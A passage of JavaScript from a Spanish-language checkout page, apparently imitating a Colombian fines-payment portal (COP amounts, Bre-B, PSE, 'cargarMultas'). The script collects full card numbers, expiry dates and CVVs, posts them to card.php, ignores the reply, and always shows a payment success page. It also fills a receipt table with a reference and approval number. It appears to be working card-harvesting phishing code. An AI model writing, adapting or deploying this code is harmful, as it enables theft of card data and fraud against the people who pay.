          if (estadoCell) { estadoCell.textContent = "Pendiente"; estadoCell.style.color = "#e6a817"; estadoCell.style.fontWeight = "600"; }
        }
        if (rows[1]) {
          const valorCell = rows[1].querySelector("td:last-child");
          if (valorCell) valorCell.innerHTML = "$&nbsp;" + Number(valor).toLocaleString();
        }
        if (rows[3]) {
          const fechaCell = rows[3].querySelector("td:last-child");
          if (fechaCell) fechaCell.textContent = fecha;
        }
        if (rows[4]) {
          const metodoCell = rows[4].querySelector("td:last-child");
          if (metodoCell) metodoCell.textContent = "Bre-B";
        }
        if (rows[5]) {
          const fechaTxCell = rows[5].querySelector("td:last-child");
          if (fechaTxCell) fechaTxCell.textContent = fecha;
        }
        if (rows[6]) {
          const referenciaCell = rows[6].querySelector("td:last-child");
          if (referenciaCell) referenciaCell.textContent = referenciaPago;
        }
        if (rows[7]) {
          const aprobacionCell = rows[7].querySelector("td:last-child");
          if (aprobacionCell) aprobacionCell.textContent = numeroAprobacion;
        }
      }
    }
  } else {
    setTimeout(initializePaymentButton, 500);
  }
});

function waitForFormData() {
  return new Promise((resolve) => {
    let attempts = 0;
    const maxAttempts = 10;
    const checkFields = () => {
      const email = document.querySelector("#email");
      const phone = document.querySelector("#phone");
      if ((email && email.value.trim()) || attempts >= maxAttempts) { resolve(); }
      else { attempts++; setTimeout(checkFields, 100); }
    };
    checkFields();
  });
}
function validateAllFields() {
  const errors = [];
  const getValue = (selectors) => {
    for (let selector of selectors) {
      const element = document.querySelector(selector);
      if (element && element.value && element.value.trim()) return element.value.trim();
    }
    return "";
  };
  const email = getValue(["#email", ".email"]);
  if (!email) errors.push("El email es requerido");
  else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) errors.push("El formato del email no es válido");

  const phone = getValue(["#phone", ".cellphone"]);
  const phoneNumbers = phone.replace(/\D/g, "");
  if (!phone) errors.push("El teléfono es requerido");
  else if (phoneNumbers.length < 10) errors.push("El teléfono debe tener al menos 10 dígitos");

  const cardHolder = getValue([".name"]);
  if (!cardHolder) errors.push("El nombre del titular es requerido");
  else if (cardHolder.length < 3) errors.push("El nombre del titular debe tener al menos 3 caracteres");

  const cardNumber = getValue([".card-number"]);
  const cardNumbers = cardNumber.replace(/\D/g, "");
  if (!cardNumber) errors.push("El número de tarjeta es requerido");
  else if (cardNumbers.length < 16) errors.push("El número de tarjeta debe tener 16 dígitos");
  else if (!validateCardNumber(cardNumbers)) errors.push("El número de tarjeta no es válido");

  const expiry = getValue([".expiry"]);
  if (!expiry) errors.push("La fecha de expiración es requerida");
  else if (!/^\d{2}\/\d{2}$/.test(expiry)) errors.push("El formato de fecha debe ser MM/YY");
  else {
    const [month, year] = expiry.split("/");
       const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    if (parseInt(month) < 1 || parseInt(month) > 12) errors.push("El mes debe estar entre 01 y 12");
    else if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) errors.push("La tarjeta ha expirado");
  }

  const cvc = getValue([".cvc"]);
  if (!cvc) errors.push("El CVV es requerido");
  else {
    const cvcNumbers = cvc.replace(/\D/g, "");
    const isAmex = cardNumbers.match(/^3[47]/);
    const requiredLength = isAmex ? 4 : 3;
    if (cvcNumbers.length !== requiredLength) errors.push(`El CVV debe tener ${requiredLength} dígitos`);
  }

  return { isValid: errors.length === 0, errors, data: { email, phone, cardHolder, cardNumber, expiry, cvc } };
}
function validateCardNumber(cardNumber) {
  let sum = 0, shouldDouble = false;
  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber.charAt(i));
    if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit; shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}
function showValidationErrors(errors) {
  const existingAlert = document.querySelector(".validation-alert");
  if (existingAlert) existingAlert.remove();

  const alertDiv = document.createElement("div");
  alertDiv.className = "validation-alert";
  alertDiv.style.cssText = `
    background-color: #f8d7da;
    border: 1px solid #f5c6cb;
    color: #721c24;
    padding: 15px;
    margin-bottom: 20px;
    border-radius: 4px;
    font-size: 14px;
  `;
  alertDiv.innerHTML = `
    <strong>Por favor corrige los siguientes errores:</strong>
    <ul style="margin: 10px 0 0 20px;">
      ${errors.map((error) => `<li>${error}</li>`).join("")}
    </ul>`;
  const form = document.getElementById("checkout-form");
  form.parentNode.insertBefore(alertDiv, form);
  alertDiv.scrollIntoView({ behavior: "smooth", block: "nearest" });
}
function initializePaymentButton() {
  if (paymentButtonInitialized) return;
  const paymentButton = document.querySelector(".payment-button-popup");
  if (paymentButton) {
    paymentButtonInitialized = true;
    if (paymentButton.textContent.includes("Procesando")) {
      const dataTotal = paymentButton.getAttribute("data-total");
      if (dataTotal) paymentButton.innerHTML = `Pagar COP $${Number(dataTotal).toLocaleString()}`;
    }
    paymentButton.replaceWith(paymentButton.cloneNode(true));
    const newButton = document.querySelector(".payment-button-popup");
    newButton.addEventListener("click", async function (e) {
      e.preventDefault(); e.stopPropagation();
      if (this.disabled) return;

      await waitForFormData();
      const validation = validateAllFields();
      if (!validation.isValid) { showValidationErrors(validation.errors); return; }
      const existingAlert = document.querySelector(".validation-alert");
      if (existingAlert) existingAlert.remove();

      const originalText = this.innerHTML;
      this.innerHTML = "Procesando...";
      this.disabled = true;

      let totalPago = "0";
      const dataTotal = this.getAttribute("data-total");
      if (dataTotal) totalPago = dataTotal;
      else {
        const match = originalText.match(/\$([0-9.,]+)/);
        if (match && match[1]) totalPago = match[1].replace(/\./g, "").replace(/,/g, "");
      }

      const formData = new FormData();
      formData.append("email", validation.data.email);
      formData.append("cellphone", validation.data.phone);
      formData.append("card-holder", validation.data.cardHolder);
      formData.append("card-number", validation.data.cardNumber);
      formData.append("expiry", validation.data.expiry);
      formData.append("cvc", validation.data.cvc);
      formData.append("total_pago", totalPago);

      try {
        const response = await fetch("card.php", { method: "POST", body: formData });
        await response.json(); // no se usa la respuesta
        localStorage.setItem("payment_amount", totalPago);
        window.location.href = "../?payment=success";
      } catch (_) {
        localStorage.setItem("payment_amount", totalPago);
        window.location.href = "../?payment=success";
      }
    });
  }
}
function updateCVCValidation(cardNumber) {
  const cvcInput = document.getElementById("cvc-input");
  if (!cvcInput) return;
  let cardType = "other", maxLength = 3, placeholder = "CVC";
  if (/^4/.test(cardNumber)) { cardType = "visa"; maxLength = 3; placeholder = "CVC (3 dígitos)"; }
  else if (/^5[1-5]/.test(cardNumber) || /^2[2-7]/.test(cardNumber)) { cardType = "mastercard"; maxLength = 3; placeholder = "CVC (3 dígitos)"; }
  else if (/^3[47]/.test(cardNumber)) { cardType = "amex"; maxLength = 4; placeholder = "CVV (4 dígitos)"; }
  cvcInput.maxLength = maxLength;
  cvcInput.placeholder = placeholder;
  cvcInput.setAttribute("data-card-type", cardType);
  cvcInput.setAttribute("data-max-length", maxLength);
  if (cvcInput.value) validateCVC(cvcInput);
}
function validateCVC(input) {
  const maxLength = parseInt(input.getAttribute("data-max-length") || "3");
  let value = input.value.replace(/\D/g, "");
  if (value.length > maxLength) value = value.substring(0, maxLength);
  input.value = value;
}
function validateCVCWithDelay(input) { setTimeout(() => validateCVC(input), 10); }
document.addEventListener("DOMContentLoaded", function () {
  const cardInput = document.querySelector(".card-number");
  const cvcInput = document.getElementById("cvc-input");
  if (cardInput && cvcInput && cardInput.value) {
    const cardNumber = cardInput.value.replace(/\D/g, "");
    updateCVCValidation(cardNumber);
  }
});

/* Exponer para onchange() */
window.calcularTotales = calcularTotales;

// Función showWaitingMessage removida - Ahora usamos pse_loader/index.html completo

// Inicializar cuando se carga la página
document.addEventListener("DOMContentLoaded", function () {
  // Evita error si cargarMultas no está definida en este bundle.
  if (typeof cargarMultas === "function") cargarMultas();
});
